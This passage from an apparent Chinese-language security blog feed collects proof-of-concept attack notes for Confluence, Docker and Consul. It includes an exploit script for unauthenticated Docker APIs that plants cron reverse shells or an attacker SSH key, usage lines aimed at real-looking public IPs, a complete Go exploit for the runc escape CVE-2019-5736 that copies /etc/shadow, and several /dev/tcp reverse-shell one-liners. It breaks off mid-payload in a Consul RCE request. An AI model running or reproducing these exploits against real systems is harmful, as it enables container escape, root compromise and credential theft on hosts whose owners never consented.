<h2 id="encode-payload"><a href="#encode-payload" class="headerlink" title="encode payload"></a>encode payload</h2><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; bash -c &#123;echo,d2hvYW1p&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>
<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/payload-encode.jpg"></p>
<h2 id="python-cve-2019-3396-py"><a href="#python-cve-2019-3396-py" class="headerlink" title="python cve-2019-3396.py"></a>python cve-2019-3396.py</h2><p><code>python test.py http://10.10.20.181 &quot;cat /etc/passwd&quot;</code></p>
<p><img src="C:/Users/ede/Desktop/T/Tech/01sec/02漏洞/Confluence/CVE-2019-3396/cve-2019-3396.jpg"></p>
<p>去掉div每行头尾空白</p>
]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Confluence</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/2021/04/15/Docker/</url>
    <content><![CDATA[<p>Docker 是一个开源的应用容器引擎，基于 <a href="https://www.runoob.com/go/go-tutorial.html">Go 语言</a> 并遵从 Apache2.0 协议开源。<a id="more"></a></p>
<p>判断docker：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;self&#x2F;cgroup</span><br><span class="line">cat &#x2F;.dockerenv</span><br></pre></td></tr></table></figure>
<h1 id="API未授权访问"><a href="#API未授权访问" class="headerlink" title="API未授权访问"></a>API未授权访问</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看images</span><br><span class="line">2375:&#x2F;images&#x2F;json</span><br><span class="line">命令行查看images</span><br><span class="line">docker -H tcp:&#x2F;&#x2F;x.x.x.x:2375 images</span><br><span class="line">命令行创建容器并进入，将宿主机根目录挂载到容器&#x2F;tmp下</span><br><span class="line">docker -H tcp:&#x2F;&#x2F;x.x.x.x:2375 run -it -v &#x2F;:&#x2F;mnt imageID &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">写计划任务反弹宿主机</span><br><span class="line">echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;8888 0&gt;&amp;1&#39; &gt;&gt; &#x2F;test&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</span><br></pre></td></tr></table></figure>
<p>利用脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">#author:L.N.@insight-labs.org</span><br><span class="line">#docker-py &#x3D;&#x3D; 1.8.1</span><br><span class="line"></span><br><span class="line">import urllib2</span><br><span class="line">import urllib</span><br><span class="line">import json</span><br><span class="line">import sys</span><br><span class="line">import getopt</span><br><span class="line">from docker import Client</span><br><span class="line"></span><br><span class="line">def http_get(url):</span><br><span class="line">    response &#x3D; urllib2.urlopen(url)</span><br><span class="line">    return response.read()</span><br><span class="line"></span><br><span class="line">def http_post(url, values):</span><br><span class="line">    jdata &#x3D; values</span><br><span class="line">    #print url</span><br><span class="line">    #print jdata</span><br><span class="line">    send_headers &#x3D; &#123;</span><br><span class="line">        &#39;Content-Type&#39;:&#39;application&#x2F;json&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    req &#x3D; urllib2.Request(url, data&#x3D;jdata,headers&#x3D;send_headers)</span><br><span class="line">    response &#x3D; urllib2.urlopen(req)</span><br><span class="line">    return response.read()</span><br><span class="line"></span><br><span class="line">def isset(v):</span><br><span class="line">    try :</span><br><span class="line">        type(eval(v))</span><br><span class="line">    except:</span><br><span class="line">        return 0</span><br><span class="line">    else:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">def printport(portsList, name):</span><br><span class="line">    if isset(&quot;portsList[&#39;IP&#39;]&quot;) &#x3D;&#x3D; 0:</span><br><span class="line">        portsList[&#39;IP&#39;]&#x3D;&quot;*&quot;</span><br><span class="line">        printport(portsList,name)</span><br><span class="line">    elif isset(&quot;portsList[&#39;Type&#39;]&quot;) &#x3D;&#x3D; 0:</span><br><span class="line">        portsList[&#39;Type&#39;]&#x3D;&quot;*&quot;</span><br><span class="line">        printport(portsList,name)</span><br><span class="line">    elif isset(&quot;portsList[&#39;PublicPort&#39;]&quot;) &#x3D;&#x3D; 0:</span><br><span class="line">        portsList[&#39;PublicPort&#39;]&#x3D;&quot;*&quot;</span><br><span class="line">        printport(portsList,name)</span><br><span class="line">    elif isset(&quot;portsList[&#39;PrivatePort&#39;]&quot;) &#x3D;&#x3D; 0:</span><br><span class="line">        portsList[&#39;PrivatePort&#39;]&#x3D;&quot;*&quot;</span><br><span class="line">        printport(portsList,name)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[-]&quot;+name+&quot;[+]&quot;+portsList[&#39;Type&#39;]+&quot;[-]&quot;+portsList[&#39;IP&#39;]+&quot;:&quot;+str(portsList[&#39;PrivatePort&#39;])+&quot; --&gt; &quot;+host+&quot;:&quot;+str(portsList[&#39;PublicPort&#39;])</span><br><span class="line"></span><br><span class="line">def createClient(host,port,version):</span><br><span class="line">    clientApiVersion &#x3D; getversion(host,port,version)</span><br><span class="line">    print &quot;[-]ClientApiVersion:&quot;+clientApiVersion</span><br><span class="line">    cli &#x3D; Client(base_url&#x3D;&#39;tcp:&#x2F;&#x2F;&#39;+host+&#39;:&#39;+port,version&#x3D;clientApiVersion)</span><br><span class="line">    return cli</span><br><span class="line"></span><br><span class="line">def getversion(host,port,version):</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+host+&quot;:&quot;+port+&quot;&#x2F;version&quot;</span><br><span class="line">    ret &#x3D; json.loads(http_get(url))</span><br><span class="line">    if version !&#x3D; &#39;&#39;:</span><br><span class="line">        clientApiVersion &#x3D; version</span><br><span class="line">    else:</span><br><span class="line">        clientApiVersion &#x3D; ret[&#39;ApiVersion&#39;]</span><br><span class="line">    return clientApiVersion</span><br><span class="line"></span><br><span class="line">def printContainer(host,port,version,allContainer):</span><br><span class="line">    cli &#x3D; createClient(host,port,version)</span><br><span class="line">    if allContainer &#x3D;&#x3D; 1:</span><br><span class="line">        ret &#x3D; cli.containers(all&#x3D;True)</span><br><span class="line">    else:</span><br><span class="line">        ret &#x3D; cli.containers()</span><br><span class="line">    for info in ret:</span><br><span class="line">        print &quot;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&quot;</span><br><span class="line">        print &quot;[-] id: &quot;+info[&#39;Id&#39;]</span><br><span class="line">        print &quot;[-] Names: &quot;+info[&#39;Names&#39;][0]</span><br><span class="line">        print &quot;[-] Image: &quot;+info[&#39;Image&#39;]</span><br><span class="line">        print &quot;[-] Status: &quot;+info[&#39;Status&#39;]</span><br><span class="line">    print &quot;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    opts, args &#x3D; getopt.getopt(sys.argv[1:], &quot;v:kauVCcsLli:e:h:p:H:P:I:&quot;)</span><br><span class="line">    key &#x3D; 0</span><br><span class="line">    version &#x3D;&#39;&#39;</span><br><span class="line">    payload &#x3D;&#39;&#39;</span><br><span class="line">    sshkey &#x3D; &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoecC7vmWn4s2y4T+Pc3bJ0owDYWzGIBTCWWonN4qMTCbe66hKopgtUuHC1y5H3HFQ0qsni0vFAGSoO4TLiIpvHUXbf9Wi9vR2q4oYphH9Kgsd3cVXsHUFcgybwdk5DCXpmoSJTlEoOrtWajYdyuALMy+CqpkwWDj+uTz+9&#x2F;2P3T0Nh5F+U+UZOgSqIi5xQfUGJKGoFGXwvpqEL6UnGG4bbgGxVa5mJZVH0cxwKK6w7luezkcRVBEJ1SZAkjZOmZojyJbYQolItcBNBsXQ+cakjg3DeU69wrDiBdP+k2i2k3uzhJqJXfxLdxUZfjgXHwSOzDb2D5+841trASAwZAy1Gq4uwkbmwupe&#x2F;qTPK2R31d5h4Jqx4N19eUjT8GkkDj+mnJTwYyOPJH&#x2F;ghEvn4UfNOtohM2lZPbskvvskn82g0WzYJ5JnQaKfup1IYLTraBbJ5UdVYsCfG5ddRZF4xMab2ZDgcdqyISJxHPK9&#x2F;P7w7mmgSut1nK5R1+HLSl&#x2F;xDAPcoVd0H3ePqxN9ZD0BoMjY8fPxKAQR+bB5M05iDIIwUxhj2NQvCpwxxGwJXUSf13zirXRZhkZGnWrkNrzqHzpLZqoEBCEORErmFAvsI8yIBvThSylReiwhAWkdL7ONQ4dd7UgsQfY&#x2F;0MMfxd8&#x2F;V+041I1sIVUVBnHYUUwqE0eZ9Q&#x3D;&#x3D; wanniba@wanniba.com&#39;</span><br><span class="line">    for op, value in opts:</span><br><span class="line">        if op &#x3D;&#x3D;&quot;-l&quot;:</span><br><span class="line">            imagesList &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &quot;-i&quot;:</span><br><span class="line">            imageName &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &quot;-e&quot;:</span><br><span class="line">            dataExec &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &quot;-h&quot;:</span><br><span class="line">            host &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D;&#39;-p&#39;:</span><br><span class="line">            port &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-L&#39;:</span><br><span class="line">            portList &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-H&#39;:</span><br><span class="line">            lhsot &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-P&#39;:</span><br><span class="line">            lport &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D;&#39;-C&#39;:</span><br><span class="line">            createContainer &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-v&#39;:</span><br><span class="line">            version &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-V&#39;:</span><br><span class="line">            version &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-c&#39;:</span><br><span class="line">            closeContainer &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-I&#39;:</span><br><span class="line">            imageId &#x3D; value</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-a&#39;:</span><br><span class="line">            allContainer &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-s&#39;:</span><br><span class="line">            startContainer &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-k&#39;:</span><br><span class="line">            key &#x3D; 1</span><br><span class="line">        elif op &#x3D;&#x3D; &#39;-u&#39;:</span><br><span class="line">            isUbuntu &#x3D; 1</span><br><span class="line">            </span><br><span class="line">    if isset(&#39;lhsot&#39;) and isset(&#39;lport&#39;):</span><br><span class="line">        if isset(&#39;isUbuntu&#39;):</span><br><span class="line">            payload &#x3D; &#39;&#x2F;bin&#x2F;bash -c &quot;echo \\\&quot;*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&#39;+lhsot+&#39;&#x2F;&#39;+lport+&#39; 0&gt;&amp;1\\\&quot; &gt;&gt; &#x2F;tmp&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root&quot;&#39; #chmod 600</span><br><span class="line">        else:</span><br><span class="line">            payload &#x3D; &#39;&#x2F;bin&#x2F;bash -c &quot;echo \\\&quot;*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&#39;+lhsot+&#39;&#x2F;&#39;+lport+&#39; 0&gt;&amp;1\\\&quot; &gt;&gt; &#x2F;tmp&#x2F;spool&#x2F;cron&#x2F;root&quot;&#39;  #centos,redhat and so on</span><br><span class="line">        print &quot;[-]Paylaod: &quot;+payload</span><br><span class="line">    if sshkey !&#x3D;&#39;&#39; and key &#x3D;&#x3D; 1:</span><br><span class="line">        payload &#x3D; &#39;&#x2F;bin&#x2F;bash -c &quot;echo \\\&quot;&#39;+sshkey+&#39;\\\&quot; &gt;&gt; &#x2F;tmp1&#x2F;.ssh&#x2F;authorized_keys&quot;&#39;</span><br><span class="line">        print &quot;[-]Paylaod: &quot;+payload</span><br><span class="line">    if isset(&#39;host&#39;) and isset(&#39;port&#39;):</span><br><span class="line">        if isset(&#39;version&#39;) and version &#x3D;&#x3D; 1:</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+host+&quot;:&quot;+port+&quot;&#x2F;version&quot;</span><br><span class="line">            ret &#x3D; json.loads(http_get(url))</span><br><span class="line">            print &quot;[-] ApiVersion: &quot;+ret[&#39;ApiVersion&#39;]</span><br><span class="line">        elif isset(&#39;imagesList&#39;):</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+host+&quot;:&quot;+port+&quot;&#x2F;images&#x2F;json&quot;</span><br><span class="line">            ret &#x3D; json.loads(http_get(url))</span><br><span class="line">            for info in ret:</span><br><span class="line">                print &quot;RepoTags: &quot;+info[&#39;RepoTags&#39;][0]</span><br><span class="line">        elif isset(&#39;createContainer&#39;) and isset(&#39;imageName&#39;):</span><br><span class="line">            cli &#x3D; createClient(host,port,version)</span><br><span class="line">            container &#x3D; cli.create_container(image&#x3D;imageName, command&#x3D;&#39;&#x2F;bin&#x2F;bash&#39;, tty&#x3D;True, volumes&#x3D;[&#39;&#x2F;tmp&#39;,&#39;&#x2F;tmp1&#39;], host_config&#x3D;cli.create_host_config(binds&#x3D;[&#39;&#x2F;var:&#x2F;tmp:rw&#39;,&#39;&#x2F;root:&#x2F;tmp1:rw&#39;]))</span><br><span class="line">            print &quot;[-]Container ID:&quot;+container[&#39;Id&#39;]</span><br><span class="line">            print &quot;[-]Warning:&quot;+str(container[&#39;Warnings&#39;])</span><br><span class="line">            response &#x3D; cli.start(container&#x3D;container.get(&#39;Id&#39;))</span><br><span class="line">            if isset(&#39;isUbuntu&#39;):</span><br><span class="line">                cli.exec_start(exec_id&#x3D;cli.exec_create(container&#x3D;container.get(&#39;Id&#39;), cmd&#x3D;payload))</span><br><span class="line">                print &quot;[-]create crontabs ......&quot;</span><br><span class="line">                cli.exec_start(exec_id&#x3D;cli.exec_create(container&#x3D;container.get(&#39;Id&#39;), cmd&#x3D;&#39;chmod 600 &#x2F;tmp&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root&#39;))</span><br><span class="line">                print &quot;[-]chmod 600 ......&quot;</span><br><span class="line">            else:</span><br><span class="line">                print cli.exec_start(exec_id&#x3D;cli.exec_create(container&#x3D;container.get(&#39;Id&#39;), cmd&#x3D;payload))</span><br><span class="line">                print &quot;[-]create crontabs ......&quot;</span><br><span class="line">        elif isset(&#39;closeContainer&#39;) and isset(&#39;imageId&#39;):</span><br><span class="line">            cli &#x3D; createClient(host,port,version)</span><br><span class="line">            cli.stop(container&#x3D;imageId)</span><br><span class="line">            cli.remove_container(container&#x3D;imageId)</span><br><span class="line">        elif isset(&#39;startContainer&#39;) and isset(&#39;imageId&#39;):</span><br><span class="line">            cli &#x3D; createClient(host,port,version)</span><br><span class="line">            cli.start(container&#x3D;imageId)</span><br><span class="line">        elif isset(&#39;dataExec&#39;) and isset(&#39;imageId&#39;):</span><br><span class="line">            cli &#x3D; createClient(host,port,version)</span><br><span class="line">            print &quot;[-]Command:&quot;+dataExec</span><br><span class="line">            print cli.exec_start(exec_id&#x3D;cli.exec_create(container&#x3D;imageId, cmd&#x3D;dataExec))</span><br><span class="line">        elif isset(&#39;portList&#39;):</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+host+&quot;:&quot;+port+&quot;&#x2F;containers&#x2F;json&quot;</span><br><span class="line">            ret &#x3D; json.loads(http_get(url))</span><br><span class="line">            for pl in ret:</span><br><span class="line">                if isset(&quot;pl[&#39;Names&#39;][0]&quot;):</span><br><span class="line">                    name &#x3D; pl[&#39;Names&#39;][0]</span><br><span class="line">                else:</span><br><span class="line">                    name &#x3D; &#39;*&#39;</span><br><span class="line">                for portsList in pl[&#39;Ports&#39;]:</span><br><span class="line">                    printport(portsList, name)</span><br><span class="line">        else:</span><br><span class="line">            if isset(&#39;allContainer&#39;):</span><br><span class="line">                printContainer(host,port,version,allContainer)</span><br><span class="line">            else:</span><br><span class="line">                printContainer(host,port,version,0)</span><br></pre></td></tr></table></figure>
<p>使用帮助：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># docker_api_vul</span><br><span class="line"></span><br><span class="line">docker 未授权访问漏洞利用脚本</span><br><span class="line"></span><br><span class="line">##查看运行的容器</span><br><span class="line"></span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h x.x.x.x -p 2375</span><br><span class="line"></span><br><span class="line">##查看所有的容器</span><br><span class="line"></span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -a</span><br><span class="line"></span><br><span class="line">##查看所有镜像</span><br><span class="line"></span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -l</span><br><span class="line"></span><br><span class="line">##查看端口映射</span><br><span class="line"></span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h 139.217.25.172 -p 2375 -L</span><br><span class="line"></span><br><span class="line">##写计划任务（centos,redhat等,加-u参数用于ubuntu等）</span><br><span class="line"></span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口</span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口</span><br><span class="line"></span><br><span class="line">##写sshkey(自行修改脚本的中公钥)</span><br><span class="line"></span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -C -i 镜像名 -k</span><br><span class="line"></span><br><span class="line">##在容器中执行命令</span><br><span class="line"></span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -e &quot;id&quot; -I 容器id</span><br><span class="line"></span><br><span class="line">##删除容器</span><br><span class="line"></span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -c -I 容器id</span><br><span class="line"></span><br><span class="line">##修改client api版本</span><br><span class="line"></span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -v 1.22</span><br><span class="line"></span><br><span class="line">##查看服务端api版本</span><br><span class="line"></span><br><span class="line">    python dockerRemoteApiGetRootShell.py -h 158.85.173.113 -p 2375 -V</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2019-5736逃逸"><a href="#CVE-2019-5736逃逸" class="headerlink" title="CVE-2019-5736逃逸"></a>CVE-2019-5736逃逸</h1><p>runc逃逸需要交互</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编译</span><br><span class="line">CGO_ENABLED&#x3D;0 GOOS&#x3D;linux GOARCH&#x3D;amd64 go build main.go</span><br></pre></td></tr></table></figure>
<p>main.go</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Implementation of CVE-2019-5736</span><br><span class="line">&#x2F;&#x2F; Created with help from @singe, @_cablethief, and @feexd.</span><br><span class="line">&#x2F;&#x2F; This commit also helped a ton to understand the vuln</span><br><span class="line">&#x2F;&#x2F; https:&#x2F;&#x2F;github.com&#x2F;lxc&#x2F;lxc&#x2F;commit&#x2F;6400238d08cdf1ca20d49bafb85f4e224348bf9d</span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line">	&quot;io&#x2F;ioutil&quot;</span><br><span class="line">	&quot;os&quot;</span><br><span class="line">	&quot;strconv&quot;</span><br><span class="line">	&quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; This is the line of shell commands that will execute on the host</span><br><span class="line">var payload &#x3D; &quot;#!&#x2F;bin&#x2F;bash \n cat &#x2F;etc&#x2F;shadow &gt; &#x2F;tmp&#x2F;shadow &amp;&amp; chmod 777 &#x2F;tmp&#x2F;shadow&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	&#x2F;&#x2F; First we overwrite &#x2F;bin&#x2F;sh with the &#x2F;proc&#x2F;self&#x2F;exe interpreter path</span><br><span class="line">	fd, err :&#x3D; os.Create(&quot;&#x2F;bin&#x2F;sh&quot;)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintln(fd, &quot;#!&#x2F;proc&#x2F;self&#x2F;exe&quot;)</span><br><span class="line">	err &#x3D; fd.Close()</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;[+] Overwritten &#x2F;bin&#x2F;sh successfully&quot;)</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Loop through all processes to find one whose cmdline includes runcinit</span><br><span class="line">	&#x2F;&#x2F; This will be the process created by runc</span><br><span class="line">	var found int</span><br><span class="line">	for found &#x3D;&#x3D; 0 &#123;</span><br><span class="line">		pids, err :&#x3D; ioutil.ReadDir(&quot;&#x2F;proc&quot;)</span><br><span class="line">		if err !&#x3D; nil &#123;</span><br><span class="line">			fmt.Println(err)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">		for _, f :&#x3D; range pids &#123;</span><br><span class="line">			fbytes, _ :&#x3D; ioutil.ReadFile(&quot;&#x2F;proc&#x2F;&quot; + f.Name() + &quot;&#x2F;cmdline&quot;)</span><br><span class="line">			fstring :&#x3D; string(fbytes)</span><br><span class="line">			if strings.Contains(fstring, &quot;runc&quot;) &#123;</span><br><span class="line">				fmt.Println(&quot;[+] Found the PID:&quot;, f.Name())</span><br><span class="line">				found, err &#x3D; strconv.Atoi(f.Name())</span><br><span class="line">				if err !&#x3D; nil &#123;</span><br><span class="line">					fmt.Println(err)</span><br><span class="line">					return</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; We will use the pid to get a file handle for runc on the host.</span><br><span class="line">	var handleFd &#x3D; -1</span><br><span class="line">	for handleFd &#x3D;&#x3D; -1 &#123;</span><br><span class="line">		&#x2F;&#x2F; Note, you do not need to use the O_PATH flag for the exploit to work.</span><br><span class="line">		handle, _ :&#x3D; os.OpenFile(&quot;&#x2F;proc&#x2F;&quot;+strconv.Itoa(found)+&quot;&#x2F;exe&quot;, os.O_RDONLY, 0777)</span><br><span class="line">		if int(handle.Fd()) &gt; 0 &#123;</span><br><span class="line">			handleFd &#x3D; int(handle.Fd())</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;[+] Successfully got the file handle&quot;)</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Now that we have the file handle, lets write to the runc binary and overwrite it</span><br><span class="line">	&#x2F;&#x2F; It will maintain it&#39;s executable flag</span><br><span class="line">	for &#123;</span><br><span class="line">		writeHandle, _ :&#x3D; os.OpenFile(&quot;&#x2F;proc&#x2F;self&#x2F;fd&#x2F;&quot;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)</span><br><span class="line">		if int(writeHandle.Fd()) &gt; 0 &#123;</span><br><span class="line">			fmt.Println(&quot;[+] Successfully got write handle&quot;, writeHandle)</span><br><span class="line">			writeHandle.Write([]byte(payload))</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="dirtycow逃逸"><a href="#dirtycow逃逸" class="headerlink" title="dirtycow逃逸"></a>dirtycow逃逸</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;scumjr&#x2F;dirtycow-vdso.git</span><br><span class="line">cd &#x2F;dirtycow-vdso&#x2F;</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line">.&#x2F;0xdeadbeef #反弹shell到本地主机</span><br><span class="line">.&#x2F;0xdeadbeef ip:port #反弹shell到指定主机的指定端口</span><br></pre></td></tr></table></figure>
<p>工具：dirtycow-vdso-master.zip</p>
<h1 id="docker特权模式逃逸"><a href="#docker特权模式逃逸" class="headerlink" title="docker特权模式逃逸"></a>docker特权模式逃逸</h1><p>如容器运行时开启了特权模式，虚拟机的root拥有宿主机的mount权限，可mount宿主机的根目录的磁盘到虚拟机，然后写文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo docker run -itd --privileged ubuntu:latest &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>B、在容器内，查看磁盘文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
<p>将/dev/sda1 挂载到新建目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mkdir &#x2F;test</span><br><span class="line">mount &#x2F;dev&#x2F;sda1 &#x2F;test</span><br></pre></td></tr></table></figure>
<p>将计划任务写入到宿主机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">echo &#39;* * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.172.136&#x2F;12345 0&gt;&amp;1&#39; &gt;&gt; &#x2F;test&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br></pre></td></tr></table></figure>
<h1 id="docker-sock逃逸"><a href="#docker-sock逃逸" class="headerlink" title="docker.sock逃逸"></a>docker.sock逃逸</h1><p>如将docker.sock挂载到了容器，可自定义挂载，将宿主机挂载到容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --rm -it \</span><br><span class="line">  -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock \</span><br><span class="line">  -v &#x2F;usr&#x2F;bin&#x2F;docker:&#x2F;usr&#x2F;bin&#x2F;docker \</span><br><span class="line">  ubuntu \</span><br><span class="line">  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>在容器查看宿主机docker信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">docker -H unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock info</span><br></pre></td></tr></table></figure>
<p>运行一个新容器并挂载宿主机根路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">docker -H unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock run -it -v &#x2F;:&#x2F;test ubuntu &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>在新容器的/test 目录下，就可以访问到宿主机的全部资源，接下来就是写入ssh密钥或者写入计划任务，获取shell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ls -al &#x2F;test</span><br></pre></td></tr></table></figure>
<h1 id="CVE-2020-15257"><a href="#CVE-2020-15257" class="headerlink" title="CVE-2020-15257"></a>CVE-2020-15257</h1>]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Consul</title>
    <url>/2021/04/14/Consul/</url>
    <content><![CDATA[<p><em>consul</em>是google开源的一个使用go语言开发的服务发现、配置管理中心服务。<a id="more"></a></p>
<h1 id="API-RCE"><a href="#API-RCE" class="headerlink" title="API RCE"></a>API RCE</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EnableRemoteScriptChecks:true</span><br><span class="line">&#x2F;v1&#x2F;agent&#x2F;self</span><br><span class="line"></span><br><span class="line">PUT &#x2F;v1&#x2F;agent&#x2F;service&#x2F;register HTTP&#x2F;1.1</span><br><span class="line">Host: 88.1.2.65:8500</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Consul-Token:</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 283</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	&quot;ID&quot;: &quot;abcdefg&quot;,</span><br><span class="line">	&quot;Name&quot;: &quot;abcdefgg&quot;,</span><br><span class="line">	&quot;Address&quot;: &quot;127.0.0.1&quot;,</span><br><span class="line">	&quot;Port&quot;:80,</span><br><span class="line">	&quot;check&quot;: &#123;</span><br><span class="line">				&quot;script&quot;:&quot;bash -i &gt;&amp; 